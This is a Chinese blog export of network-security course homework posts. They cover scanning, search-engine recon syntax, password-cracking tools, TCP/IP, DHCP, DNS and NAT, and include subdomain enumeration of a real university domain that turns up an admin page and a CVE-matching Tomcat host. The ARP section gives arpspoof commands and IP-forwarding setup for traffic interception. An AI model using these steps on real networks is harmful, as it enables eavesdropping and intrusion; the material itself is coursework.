<h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><p><img src="/2023/11/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-1/%7BB982FBEC-1487-4e76-8A02-2B56D1BEE6E3%7D.png" alt="9"></p>
<p>将红框内的改为列表中主机使用的网络</p>
<p>WLAN勾选红框内容</p>
<p><img src="/2023/11/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-1/%7BA984A41E-58C4-490c-B40F-B073A811619C%7D.png" alt="10"></p>
<p>设置ip在同一网段下，网关不变。</p>
<p><img src="/2023/11/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-1/%7B5E8F22AA-2BF7-4f6f-A129-9FFF5C3CFF19%7D.png" alt="11"></p>
<p>此时发现已经连接成功！！！</p>
<p><img src="/2023/11/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-1/%7B8075D6BE-EEB6-4f5c-B05D-9256BE44CD5D%7D.png" alt="12"></p>
<hr>
<hr>
<p>作业完成!!!!</p>
]]></content>
      <categories>
        <category>网络渗透测试基础知识</category>
      </categories>
      <tags>
        <tag>网络渗透测试基础知识,kali,网卡与路由</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全测试课程_作业_2</title>
    <url>/2023/11/14/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-2/</url>
    <content><![CDATA[<h2 id="课堂总结"><a href="#课堂总结" class="headerlink" title="课堂总结"></a>课堂总结</h2><h3 id="主动扫描"><a href="#主动扫描" class="headerlink" title="主动扫描"></a>主动扫描</h3><p>主动扫描一般都是针对目标发送特定的数据包，然后根据目标的反应来获得一些信息。大多为利用爬虫模块对特定链接的GET,POST，Headers等请求的参数进行变形，然后重放并根据返回的数据包的信息或状态码进行判断。其行为有可能被目标系统查获。</p>
<p>以nmap为例可以通过ping ,ARP,TCP,UDP等协议进行主动扫描</p>
<ul>
<li>当目标主机与我们处于同一网段时，使用ARP协议扫描不仅速度最快而且扫描结果也是十分精准</li>
<li>对于大量主机扫描时，可以使用ping协议扫描，较为快速</li>
<li>TCP协议扫描时一般情况下使用较多的扫描方式</li>
<li>UDP协议扫描多用于非TCP协议建立连接的扫描</li>
</ul>
<h3 id="被动扫描"><a href="#被动扫描" class="headerlink" title="被动扫描"></a>被动扫描</h3><p>相较于主动扫描，被动扫描多是通过系统发出的包进行判断或通过流量、代理等方式去采集测试数据源。与目标系统不产生交互。</p>
<p><img src="/2023/11/14/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-2/%7B3D0F4BB3-1DF3-4669-877D-EFCCD049117C%7D.png" alt="1"></p>
<h4 id="扫描的范围"><a href="#扫描的范围" class="headerlink" title="扫描的范围"></a>扫描的范围</h4><p>多为域名，子域名，指纹等资产。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph LR</span><br><span class="line"></span><br><span class="line">A(被动扫描范围) --&gt;B[域名]--&gt;C[子域名]</span><br><span class="line">A--&gt;D[是否含有CDN,WAF等等]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>CDN即<strong>內容分发网络</strong>（英语：Content Delivery Network或Content Distribution Network，缩写：CDN）是指一种透过互联网互相连接的电脑网络系统，利用最靠近每位用户的服务器，更快、更可靠地将音乐、图片、影片、应用程序及其他文件发送给用户，来提供高性能、可扩展性及低成本的网络内容传递给用户。</p>
</blockquote>
<p><img src="/2023/11/14/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-2/%7B6F21AD28-46E8-408f-95CC-943FBD80D3D3%7D.png" alt="2"></p>
<h3 id="google-hacking语法"><a href="#google-hacking语法" class="headerlink" title="google hacking语法"></a>google hacking语法</h3><h4 id="基本搜索"><a href="#基本搜索" class="headerlink" title="基本搜索"></a>基本搜索</h4><ul>
<li>逻辑与：and</li>
<li>逻辑或： or</li>
<li>逻辑非： -</li>
<li>完整匹配：”关键词”</li>
<li>通配符：* ?</li>
</ul>
<h4 id="高级搜索"><a href="#高级搜索" class="headerlink" title="高级搜索"></a>高级搜索</h4><p><strong>intext:</strong> 寻找正文中含有关键字的网页</p>
<p><strong>intitle:</strong> 寻找标题中含有关键字的网页</p>
<p><strong>allintitle:</strong> 用法和intitle类似，只不过可以指定多个词</p>
<p><strong>inurl</strong> 将返回url中含有关键词的网页</p>
<p><strong>site:</strong> 指定访问的站点</p>
<p><strong>filetype:</strong> 指定访问的文件类型</p>
<p><strong>link:</strong> 指定链接的网页</p>
<p>搜索引擎：ZoomEye 工业控制系统</p>
<h3 id="图片信息-metadata"><a href="#图片信息-metadata" class="headerlink" title="图片信息 metadata"></a>图片信息 metadata</h3><p>Exif专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。如GPS等隐私信息。</p>
<p>在kali里可通过exiftool 图片来查看图片的exif信息</p>
<h3 id="信息收集–字典"><a href="#信息收集–字典" class="headerlink" title="信息收集–字典"></a>信息收集–字典</h3><p><img src="/2023/11/14/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-2/%7B9E187E01-700D-4056-B3F3-380C050577E4%7D.png" alt="3"></p>
<p>字典爆破与生成有着多款工具可以使用，其中kali自带Hydra爆破工具。pydictor可以基于网页内容自定义密码，同时支持增插删改自定义密码内容。而Hascat支持MD5等多种hash算法可用于rar,pdf,office,windows账户进行破解。</p>
<h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><p>常用的有ZooEye ,fofa,360quark等，每种产品功能基本相同，多用于搜索指定网站，CMS等。尤其是在SRC挖掘，攻防演练中。</p>
<p><img src="/2023/11/14/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-2/%7B9E3C8FFA-0CBB-4a19-A31A-0EB159157AD4%7D.png" alt="4"></p>
<details>  <summary>网络安全搜索引擎相关语法</summary> 
= ：匹配，=""时，可查询不存在字段或者值为空的情况。<p></p>
== ：完全匹配，==""时，可查询存在且值为空的情况。<p></p>
&& ：与<p></p>
|| ：或者<p></p>
!= ：不匹配，!=""时，可查询值为空的情况。<p></p>
*= ：模糊匹配，使用*或者?进行搜索，比如banner*="mys??" (个人版及以上可用)。<p></p>
() ：确认查询优先级，括号内容优先级最高。<p></p>
app：组件名称  ver：组件版本 app:apache ver:2.4   搜索 apache 2.4<p></p>
port：搜索端口号 port:22  搜索开放了SSH端口的主机<p></p>
OS：搜索指定的操作系统 OS:linux<p></p>
service：服务名称 Service:SSH   搜索SSH服务<p></p>
country：国家名   city：城市名  country:China    city: Beijing<p></p>
Device：搜索指定的设备类型，divice:router<p></p>
ip:搜索特定的IP地址，ip:192.168.1.1<p></p>
cidr：指定的CIDR网段   CIDR：192.168.158.12/24<p></p>
Service：搜索指定的服务类型，service:http<p></p>
Hostname：guet.edu.cn<p></p>
icp="京ICP证030173号"：查找备案号为“京ICP证030173号的网站<p></p>
</details>

<h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><h3 id="•与ZoomEye功能类似的搜索引擎还有哪些？"><a href="#•与ZoomEye功能类似的搜索引擎还有哪些？" class="headerlink" title="•与ZoomEye功能类似的搜索引擎还有哪些？"></a>•与ZoomEye功能类似的搜索引擎还有哪些？</h3><p>相似的有很多，比如fofa,360quark，鹰眼等</p>
<p><img src="/2023/11/14/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-2/%7BBA3C6A68-F555-47b6-AB1D-7EF087D3EABB%7D.png" alt="5"></p>
<p>每种引擎功能大多相似。用于对企业所有暴露在公网的暴露面进行梳理,迅速进行网站资产匹配，加快后续工作进程，如漏洞影响范围分析，应用分布统计等，帮助企业最大程度上保护自己的互联网资产。</p>
<h3 id="利用ZoomEye进行相关搜索，截图"><a href="#利用ZoomEye进行相关搜索，截图" class="headerlink" title="利用ZoomEye进行相关搜索，截图"></a>利用ZoomEye进行相关搜索，截图</h3><p>例如搜索运行在中国的apahce服务：</p>
<p>语法：app:apache &amp;&amp; country:china</p>
<p><img src="/2023/11/14/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-2/%7B0DBD880E-84E8-4948-9D43-9BF1B49BD19E%7D.png" alt="6"></p>
<h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><p>这里利用layer子域名收集工具来完成。对guet.edu.cn进行暴力扫描（也可以用kali自带的TheHarvester）</p>
<blockquote>
<p>TheHarvester能够收集电子邮件账号、用户名、主机名和子域名等信息。它通过Google、Bing、LinkedIn、Baidu、Yandex、People123、Jigsaw、Shodan等公开资源整理收集这些信息。 </p>
</blockquote>
<p><img src="/2023/11/14/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-2/%7BD7840373-E424-4037-85E1-C7AD3096E7C5%7D.png" alt="8"></p>
<hr>
<p>以外发现了学校网盘和超速管理界面。。。。</p>
<h5 id="题外化"><a href="#题外化" class="headerlink" title="题外化"></a>题外化</h5><p>发现一处异常网址</p>
<p><img src="/2023/11/14/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-2/%7B47111BEB-01F6-4bac-B16B-5FE6D051B285%7D.png" alt="10"></p>
<p>Apache Tomcat 是8.5.42版本，版本符合一个CVE。。。。。</p>
<hr>
<hr>
<div style="width: 220%;">
<iframe style="width:45%; transform: scale(0.9);" height="350" src="https://fofa.info/" frameborder="3" allowfullscreen>
</iframe>
</div>


]]></content>
      <categories>
        <category>网络渗透测试基础知识</category>
      </categories>
      <tags>
        <tag>网络渗透测试基础知识,kali,网卡与路由</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全测试课程-作业-4</title>
    <url>/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/</url>
    <content><![CDATA[<h2 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h2><h4 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h4><ul>
<li><p>arp（Address Resolution Protocol），即地址解析协议，属于<strong>数据链路层</strong>，是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。</p>
</li>
<li><p>cmd查看arp -a</p>
<blockquote>
<p>在以太网中，同一局域网中的一台主机想要和另一台主机进行直接通信，必须要知道目标主机的MAC地址。而在TCP&#x2F;IP协议中，网络层和传输层只关心目标主机的IP地址。这就导致在以太网中使用IP协议时，数据链路层的以太网协议含有的上层IP协议提供的数据中，只包含目的主机的IP地址。所以需要一种方法，根据目的主机的IP地址，获得其MAC地址。这就是ARP协议要做的事情。所谓地址解析（address resolution）就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。</p>
</blockquote>
</li>
</ul>
<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/image-20231127102741981.png" alt="1"></p>
<ul>
<li><p>每一个主机都有一个ARP高速缓存，此缓存中记录了最近一段时间内其它IP地址与其MAC地址的对应关系。ARP高速缓存是实时更新的，每次开机后会清空缓存并重新获取。</p>
</li>
<li><p>如果本机想与某台主机通信，则首先在ARP高速缓存(动态更新)中查找此台主机的IP和MAC信息，如果存在，则直接利用此MAC地址构造以太帧；如果不存在，主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间。</p>
</li>
<li><p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/%7B89D8FD6A-F64C-40cb-900F-6AC24E460C6B%7D.png" alt="2"></p>
<p>​      																	ARP请求广播到局域网络上的所有主机</p>
<h4 id="ARP表"><a href="#ARP表" class="headerlink" title="ARP表"></a>ARP表</h4></li>
</ul>
<p>网络设备一般都有一个ARP缓存（ARP Cache），ARP缓存用来存放IP地址和MAC地址的关联信息。在数据传送前，设备会先查找ARP缓存表。如果缓存表中存在对方设备的MAC地址，则直接采用该MAC地址来封装帧，然后将帧发送出去。如果缓存表中不存在相应的信息，则通过发送ARP 报文来获取。获取到的IP地址和MAC地址的映射关系会被放入ARP缓存表中存放一段时间。在有效期（一般为关机前）内，设备可以直接从这个表中查找目的MAC地址来进行数据封装，而无需进行ARP查询。过了这段有效期，ARP表现会被自动删除。如果目标设备位于其他网络则源设备会在ARP缓存表中查找网关的MAC地址，然后将数据发送给网关，网关再把数据转发给目的设备。</p>
<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/%7BADEF15EC-3ABE-49ea-9D9B-24F7D6E58772%7D.png" alt="3"></p>
<h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h4><p>当有2台或者多台计算机进行交互时，例如主机A与主机B进行交互，A在已知B的IP，但不知到B的MAC地址时，是无法通信的。</p>
<p>当A主机上在查询Arp缓存时未能找到B的MAC地址时，会进行广播到本地网络上的所有主机（发送的数据包含A的Ip与MAC地址），主机B的IP与广播中所请求的IP地址相同时，主机B将A的IP地址和MAC地址映射添加到本地ARP缓存中。同时主机B将包含其MAC地址的ARP回复消息直接发送回主机A。当主机A收到从主机B发来的ARP回复消息时，会用主机B的IP和MAC地址映射更新ARP缓存。</p>
<p>此时，由于主机A并不会验证B发送的回复包是否具有真实性，因此我们可以伪造成B发送回复包。例如:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">graph LR;</span><br><span class="line">  A[主机A]--ip,mac,B的ip,询问B的MAC--&gt;B[主机B]</span><br><span class="line">  C[攻击机]--疯狂回复A,B的ip,MAC--&gt;A1[主机A]</span><br></pre></td></tr></table></figure>

<p>断网攻击类型：</p>
<ul>
<li>1.主机欺骗：欺骗对象为主机。</li>
<li>2.网关欺骗：欺骗对象为网关，可以获得其他主机的进流量。</li>
</ul>
<p>利用工具：</p>
<p>​		kali ：arpspoof</p>
<p>用法：arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host。</p>
<p>参数：</p>
<blockquote>
<p>-i interface 指定要使用的接口（即指定一块网卡）</p>
<p>-t target   指定一个将被ARP毒化的主机（如果没有指定，则认为是局域网中所有主机）可以重复指定多个主机</p>
<p>host  host是你想要截获数据包的主机(通常是网关)</p>
<p> -c own|host|both         指定在恢复ARP配置时使用的硬件地址；当在清理（cleaning up）时，数据包的源地址可以用自己的也可以用主机（host）的硬件地址。</p>
<p> -r     毒化两个主机（目标和主机（host））以捕获两个方向的网络流量。（仅仅在和-t参数一起使用时有效）</p>
</blockquote>
<p>注意：<strong>在使用arp欺骗前先开启Kali的IP转发，使用命令：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>

<p>参数举例：arpspoof -i eth0 -t 192.168.0.103 192.168.0.107。</p>
<p>即： arpspoof   -i   网卡   -t    目标IP    网关。</p>
<h2 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h2><h4 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h4><p>DHCP（Dynamic Host Configuration Protocol，动态主机配置协议），前身是BOOTP协议，是一个局域网的网络协议，使用UDP协议工作，统一使用两个IANA分配的端口：67（服务器端），68（客户端）。在TCP&#x2F;IP网络中对客户机动态分配和管理IP地址等配置信息，以简化网络配置，方便用户使用及管理员的管理。</p>
<blockquote>
<p>•一台DHCP服务器可以是一台运行Windows Server、UNIX或Linux的计算机，也可以是一台路由器或交换机。</p>
</blockquote>
<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/image-20231127112833046.png" alt="4"></p>
<h4 id="DHCP-的安全问题"><a href="#DHCP-的安全问题" class="headerlink" title="DHCP 的安全问题"></a>DHCP 的安全问题</h4><p>非法DHCP服务器接入到了网络中；“冒充”为这个网段中的合法DHCP服务器。</p>
<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/image-20231127112955183.png" alt="5"></p>
<h2 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h2><p>DNS作用-主机IP地址与主机名之间的对应关系。</p>
<p>起初是随着接入网络主机的增多，这种数字标识的地址非常不便于记忆，unix便建立一个叫做hosts的文件 ， 这个文件中记录这主机域名和IP地址的对应表。这样只要输入主机名称，系统就会去加载hosts文件并查找对应关系，找到对应的IP，就可以访问这个IP的主机了。之后再Linux和windows也继承了这个文件。</p>
<p>而DNS服务器用于集中报存hosts文件，用于用户方便查询和实时更新hosts数据。DNS协议运行在UDP协议之上，使用端口号53。</p>
<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/image-20231127113431328.png" alt="6"></p>
<p>​																				域名查询图</p>
<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/image-20231127113508694.png" alt="7"></p>
<p>客户端先从本地计算机上查询域名对应的ip，如果未查询到，便访问DNS服务器（8.8.8.8 ，114.114.114.114）ip去查询域名对应的ip,若还未查询到便访问上一级DNS服务器直到根服务器位置，并返回数据。</p>
<h2 id="NAT服务"><a href="#NAT服务" class="headerlink" title="NAT服务"></a>NAT服务</h2><p>NAT（Network Address Translator，网络地址转换）是用于在本地网络中使用私有地址，在连接互联网时转而使用全局 IP 地址的技术。NAT实际上是为解决<a href="https://link.zhihu.com/?target=https://bk.tw.lvfukeji.com/baike-IPv4%E4%BD%8D%E5%9D%80%E6%9E%AF%E7%AB%AD">IPv4地址短缺</a>而开发的技术。</p>
<h4 id="NAT工作原理"><a href="#NAT工作原理" class="headerlink" title="NAT工作原理"></a>NAT工作原理</h4><p>内容参考[《什么是NAT》](<a href="https://zhuanlan.zhihu.com/p/340698491">什么是NAT？ - 知乎 (zhihu.com)</a>)</p>
<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/1.jpg" alt="8"></p>
<p>​						</p>
<ul>
<li>网络被分为私网和公网两个部分，NAT网关设置在私网到公网的路由出口位置，双向流量必须都要经过NAT网关；</li>
<li>网络访问只能先由私网侧发起，公网无法主动访问私网主机；</li>
<li>NAT 路由器在两个访问方向上完成两次地址的转换或翻译，出方向做源信息替换，入方向做目的信息替换；</li>
<li>NAT 路由器的存在对通信双方是保持透明的；</li>
<li>NAT 路由器为了实现双向翻译的功能，需要维护一张<strong>关联表</strong>，把会话的信息保存下来。</li>
</ul>
<p>NAT可以划分为以下两种类型：源网络地址转换-Source NAT-SNAT;目的网络地址转换-Destination NAT-DNAT。</p>
<p><img src="/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/3.jpg" alt="9"></p>
<p>主机 163.221.120.9 的端口号是 80，私网中有 2 个客户端 10.0.0.10 和 10.0.0.11 同时进行通信，并且这 2 个客户端的本地端口都是 1025。此时，仅仅转换 IP 地址为全局地址 202.244.174.37 ，会令转换后的数字完全一致。因此，为了区分这 2 个会话，只要将 10.0.0.11 的端口号转换为 1026 就可以解决问题。NAPT 路由器通过生成转换表，就可以正确地转换地址跟端口的组合，使客户端A、B能同时与服务器之间进行通信。</p>
<p><strong>关键点</strong>：利用端口号的唯一性实现了公网 IP 到私网 IP 的转换，理论上最多可以让 65535 台主机共用一个公网 IP 地址</p>
]]></content>
      <categories>
        <category>网络渗透测试基础知识</category>
      </categories>
      <tags>
        <tag>网络渗透测试基础知识,DNS,ARP</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全测试课程-作业-3</title>
    <url>/2023/11/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-3/</url>
    <content><![CDATA[<h3 id="TCP-IP协议"><a href="#TCP-IP协议" class="headerlink" title="TCP&#x2F;IP协议"></a>TCP&#x2F;IP协议</h3><p>TCP 提供面向有连接的通信传输，面向有连接是指在传送数据之前必须先建立连接，数据传送完成后要释放连接。</p>
<p>无论哪一方向另一方发送数据之前，都必须先在双方之间建立一条连接。在TCP&#x2F;IP协议中，TCP协议提供可靠的连接服务，连接是通过<strong>三次握手</strong>进行初始化的。同时由于TCP协议是一种面向连接的、可靠的、基于字节流的运输层通信协议，TCP是<strong>全双工模式</strong>，所以需要<strong>四次挥手</strong>关闭连接。</p>
<p><img src="/2023/11/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-3/v2-8ce8c897b4d5e7397b25eb4d4b31d7fc_720w.png" alt="0"></p>
<blockquote>
<ol>
<li><strong>SYN</strong>：简写为<code>S</code>，同步标志位，用于建立会话连接，同步序列号；</li>
<li><strong>ACK</strong>： 简写为<code>.</code>，确认标志位，对已接收的数据包进行确认；</li>
<li><strong>FIN</strong>： 简写为<code>F</code>，完成标志位，表示我已经没有数据要发送了，即将关闭连接；</li>
<li>PSH：简写为<code>P</code>，推送标志位，表示该数据包被对方接收后应立即交给上层应用，而不在缓冲区排队；</li>
<li>RST：简写为<code>R</code>，重置标志位，用于连接复位、拒绝错误和非法的数据包；</li>
<li>URG：简写为<code>U</code>，紧急标志位，表示数据包的紧急指针域有效，用来保证连接不被阻断，并督促中间设备尽快处理。</li>
</ol>
</blockquote>
<ul>
<li><p>TCP(Transfer Control Protocol，传输控制协议)和IP(Internet Protocol，网际协议)TCP&#x2F;IP演变为一种体系结构，即TCP&#x2F;IP参考模型。现在的TCP&#x2F;IP已成为一个工业标准的协议集，它最早应用于ARPAnet。</p>
</li>
<li><p>TCP&#x2F;IP是一个协议簇或协议栈，是由多个子协议组成的集合。</p>
</li>
<li><p>与OSI参考模型不同，TCP&#x2F;IP模型由应用层(Application Layer)、传输层(Transport Layer)、网际层(Internet Layer，也称为Internet层)和网络接口层(Network Interface Layer)四部分组成。</p>
</li>
</ul>
<p><img src="/2023/11/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-3/1.png" alt="1"></p>
<p><img src="/2023/11/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-3/image-20231120084635374.png" alt="2"></p>
<p>​														<strong>TCP&#x2F;IP</strong> <strong>体系中的主要协议及与各层的对应关系</strong> </p>
<h4 id="网络接口层"><a href="#网络接口层" class="headerlink" title="网络接口层"></a>网络接口层</h4><ul>
<li><strong>网络接口层属于最低的一层，它负责通过网络发送和接收分组(帧Frame)。</strong></li>
<li><strong>交换机</strong>、<strong>MAC</strong>  <strong>地址</strong>、<strong>通信媒体</strong> <strong>定义</strong> </li>
<li><strong>MAC(</strong> <strong>Media Access Control Address</strong> <strong>)</strong> <strong>地址</strong> </li>
<li><strong>物理地址</strong> <strong>-</strong> <strong>网卡地址</strong> <strong>-</strong> <strong>硬件地址</strong></li>
<li><strong>48bit</strong>： <strong>6</strong>  <strong>8</strong> <strong>字节</strong>，<strong>十六进制描述</strong> （例如Mac地址）</li>
<li><strong>唯一性</strong></li>
<li><strong>确实存在，不能更改</strong></li>
</ul>
<h4 id="网际层"><a href="#网际层" class="headerlink" title="网际层"></a>网际层</h4><p>• 也称为“互联网络层”</p>
<p>• 它相当于OSI参考模型网络层的无连接网络服务。网际层的任务是：允许位于同一网络或不同网络中的两台主机之间以分组(包Packet)的形式进行通信。</p>
<ul>
<li><p><strong>路由器、路由选择、转发分组 、IP 地址</strong> </p>
</li>
<li><p><strong>ACL（访问控制列表）、防火墙、NAT</strong></p>
</li>
<li><p>**IP  地址： 32bit **</p>
</li>
<li><p><strong>点分十进制描述</strong></p>
</li>
<li><p><strong>随着网络规划</strong></p>
</li>
<li><p><strong>可更改</strong></p>
</li>
</ul>
<h4 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h4><ul>
<li><p>允许在源和目的主机的对等体之间进行会话，负责会话对等体的应用进程之间的通信。功能类似于OSI参考模型传输层的功能。</p>
</li>
<li><p>进程 Port端口(也是个地址)、TCP、UDP</p>
</li>
</ul>
<h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><ul>
<li><p>最高层。应用层主要包括根据应用需要开发的一些高层协议，如HTTP、DNS、DHCP、telnet、FTP、SMTP、SNMP、等。随着网络应用的不断发展，新的应用层协议还会不断出现。</p>
</li>
<li><p>应用有关、用户、域名</p>
</li>
</ul>
<h3 id="TCP-IP网络中分组的传输示例"><a href="#TCP-IP网络中分组的传输示例" class="headerlink" title="TCP&#x2F;IP网络中分组的传输示例"></a>TCP&#x2F;IP网络中分组的传输示例</h3><ul>
<li><p>子网-网络由多个子网(Subnetwork)组成，每一个子网属于某一种特定类型的网络，局域网中的以太网、令牌环网、FDDI，广域网的x.25、帧中继等。</p>
</li>
<li><p>网络接入协议-计算机接入网络，必须使用这一子网中规定的接入协议。通过网络接入协议，可以让一台主机将数据通过子网发送到其他的主机。</p>
</li>
<li><p>路由器-它是连接不同子网的设备，一台路由器相当于一个中继站，将一个IP分组从某一子网中的一台主机通过一个或多个子网发送到目的主机。</p>
</li>
</ul>
<p><img src="/2023/11/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-3/image-20231120093010546.png" alt="4"></p>
<ul>
<li><p>全局地址:  对于Internet等互联网络来说，每一台主机必须拥有一个全网唯一的IP地址作为其身份的唯一标识，这个IP地址称为全局地址。当源主机发送数据到目的主机时，源主机首先要知道目的主机的IP地址。(NAT技术)</p>
</li>
<li><p>端口:  主机中的每一个进程必须具有一个在本主机中唯一的地址，这个地址称为端口（port）。通过端口，端到端的协议（如TCP）才能够将数据正确地交付给相应的进程。</p>
</li>
</ul>
<h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p><strong>Wireshark</strong>是一个<a href="https://en.wikipedia.org/wiki/Free_and_open-source_software">免费的开源</a> <a href="https://en.wikipedia.org/wiki/Packet_analyzer">数据包分析器</a>。它用于<a href="https://en.wikipedia.org/wiki/Computer_network">网络</a>故障排除、分析、软件和<a href="https://en.wikipedia.org/wiki/Communications_protocol">通信协议</a>开发以及教育。–wikipedia</p>
<p>详细简介参考<a href="https://pdai.tech/md/develop/protocol/dev-protocol-tool-wireshark.html">《工具: Wireshark介绍及抓包分析》</a>  。与之相同的还有Charies软件（可以在开发中调试端口外，Charles也可以用于分析第三方应用的通讯协议，配合Charles的SSL功能，还可以分析HTTPS协议）可以用于在PC处使用模拟器抓取app软件。</p>
